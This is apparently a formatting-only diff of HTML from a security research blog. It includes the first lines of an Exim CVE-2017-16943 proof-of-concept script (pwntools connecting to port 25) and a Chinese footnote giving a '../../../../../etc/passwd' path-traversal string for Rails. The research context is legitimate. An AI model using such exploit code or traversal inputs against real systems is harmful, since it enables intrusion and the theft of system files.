-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# CVE-2017-16943 PoC by meh at DEVCORE&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# pip install pwntools&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# CVE-2017-16943 PoC by meh at DEVCORE
+# pip install pwntools
+&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
 
 &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;127.0.0.1&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
@@ -1207,9 +1837,9 @@ The illustrations below describe the difference of heap layout:&lt;br /&gt;
 
 &lt;p&gt;And now we can go back to the step 2 at the beginning and create the same situation. When &lt;code class=&quot;highlighter-rouge&quot;&gt;next-&amp;gt;text&lt;/code&gt; is freed, it goes back to unsorted bin and we are able to overwrite libc global variables again.&lt;br /&gt;
 The following is the PoC for default configured exim:&lt;/p&gt;
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# CVE-2017-16943 PoC by meh at DEVCORE&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# pip install pwntools&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# CVE-2017-16943 PoC by meh at DEVCORE
+# pip install pwntools
+&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
 
 &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;localhost&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
@@ -1522,10 +2152,10 @@ https://lists.exim.org/lurker/message/20171125.034842.d1d75cac.en.html&lt;/p&gt;
 &lt;div class=&quot;footnotes&quot;&gt;
   &lt;ol&gt;
     &lt;li id=&quot;fn:note1&quot;&gt;
-      &lt;p&gt;其實 CVE-2016-3957 並非不安全的設計，在跟 CVE team 溝通的過程中發現 web2py 開始使用 JSON 取代 Pickle [&lt;a href=&quot;https://github.com/web2py/web2py/commit/0820926b500a321060ef6a76ce89fd35a252f8b0&quot;&gt;Ref&lt;/a&gt;]，因此判定 web2py 認為目前的設計是不洽當的，給予此編號。後來官方因故將 Pickle 改了回來，不過在沒有洩漏加密字串的前提下已經是安全的了。&amp;nbsp;&lt;a href=&quot;#fnref:note1&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+      &lt;p&gt;其實 CVE-2016-3957 並非不安全的設計，在跟 CVE team 溝通的過程中發現 web2py 開始使用 JSON 取代 Pickle [&lt;a href=&quot;https://github.com/web2py/web2py/commit/0820926b500a321060ef6a76ce89fd35a252f8b0&quot;&gt;Ref&lt;/a&gt;]，因此判定 web2py 認為目前的設計是不洽當的，給予此編號。後來官方因故將 Pickle 改了回來，不過在沒有洩漏加密字串的前提下已經是安全的了。 &lt;a href=&quot;#fnref:note1&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
     &lt;/li&gt;
     &lt;li id=&quot;fn:note2&quot;&gt;
-      &lt;p&gt;在自行架設的 web2py 環境中只會執行一次，沒有去細追 web2py 官方網站為何執行兩次。&amp;nbsp;&lt;a href=&quot;#fnref:note2&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+      &lt;p&gt;在自行架設的 web2py 環境中只會執行一次，沒有去細追 web2py 官方網站為何執行兩次。 &lt;a href=&quot;#fnref:note2&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
     &lt;/li&gt;
   &lt;/ol&gt;
 &lt;/div&gt;
@@ -3344,10 +3974,10 @@ This is DEMO page.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;div class=&quot;footnotes&quot;&gt;
   &lt;ol&gt;
     &lt;li id=&quot;fn:note1&quot;&gt;
-      &lt;p&gt;Dynamic Render Paths 目前並沒有中文翻譯，因為問題之精髓在於要產生的樣板路徑是可變動的，因此筆者認為動態樣板路徑這個翻譯較為貼切。&amp;nbsp;&lt;a href=&quot;#fnref:note1&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+      &lt;p&gt;Dynamic Render Paths 目前並沒有中文翻譯，因為問題之精髓在於要產生的樣板路徑是可變動的，因此筆者認為動態樣板路徑這個翻譯較為貼切。 &lt;a href=&quot;#fnref:note1&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
     &lt;/li&gt;
     &lt;li id=&quot;fn:note2&quot;&gt;
-      &lt;p&gt;筆者測試的環境為 Rails 4.1.4，其他 Rails 版本有可能需要用 ../../../../../etc/passwd 跳脫目前目錄。&amp;nbsp;&lt;a href=&quot;#fnref:note2&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+      &lt;p&gt;筆者測試的環境為 Rails 4.1.4，其他 Rails 版本有可能需要用 ../../../../../etc/passwd 跳脫目前目錄。 &lt;a href=&quot;#fnref:note2&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
     &lt;/li&gt;
   &lt;/ol&gt;
 &lt;/div&gt;
@@ -3967,10 +4597,10 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
 &lt;div class=&quot;footnotes&quot;&gt;
   &lt;ol&gt;
     &lt;li id=&quot;fn:note2&quot;&gt;
-      &lt;p&gt;若手動執行 dhclient，則會遭到漏洞影響。&amp;nbsp;&lt;a href=&quot;#fnref:note2&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&amp;nbsp;&lt;a href=&quot;#fnref:note2:1&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;sup&gt;2&lt;/sup&gt;&lt;/a&gt;&lt;/p&gt;
+      &lt;p&gt;若手動執行 dhclient，則會遭到漏洞影響。 &lt;a href=&quot;#fnref:note2&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt; &lt;a href=&quot;#fnref:note2:1&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;sup&gt;2&lt;/sup&gt;&lt;/a&gt;&lt;/p&gt;
     &lt;/li&gt;
     &lt;li id=&quot;fn:note1&quot;&gt;
-      &lt;p&gt;系統環境變數會受到影響，但無法被攻擊者利用。&amp;nbsp;&lt;a href=&quot;#fnref:note1&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+      &lt;p&gt;系統環境變數會受到影響，但無法被攻擊者利用。 &lt;a href=&quot;#fnref:note1&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
     &lt;/li&gt;
   &lt;/ol&gt;
 &lt;/div&gt;
@@ -4409,10 +5039,10 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
 &lt;div class=&quot;footnotes&quot;&gt;
   &lt;ol&gt;
     &lt;li id=&quot;fn:note1&quot;&gt;
-      &lt;p&gt;Google 基於效能及有效性的考量，在 Android 系統上預設停用&lt;a href=&quot;https://code.google.com/p/android/issues/detail?id=68643&quot;&gt;憑證撤銷檢查&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&lt;a href=&quot;#fnref:note1&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+      &lt;p&gt;Google 基於效能及有效性的考量，在 Android 系統上預設停用&lt;a href=&quot;https://code.google.com/p/android/issues/detail?id=68643&quot;&gt;憑證撤銷檢查&lt;/a&gt;&lt;br /&gt; &lt;a href=&quot;#fnref:note1&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
     &lt;/li&gt;
     &lt;li id=&quot;fn:note2&quot;&gt;
-      &lt;p&gt;OWASP 的 Android 範例中，內含的 PUB_KEY 是錯誤的 (最後更改日期 2014/08/14)&amp;nbsp;&lt;a href=&quot;#fnref:note2&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+      &lt;p&gt;OWASP 的 Android 範例中，內含的 PUB_KEY 是錯誤的 (最後更改日期 2014/08/14) &lt;a href=&quot;#fnref:note2&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
     &lt;/li&gt;
   &lt;/ol&gt;
 &lt;/div&gt;
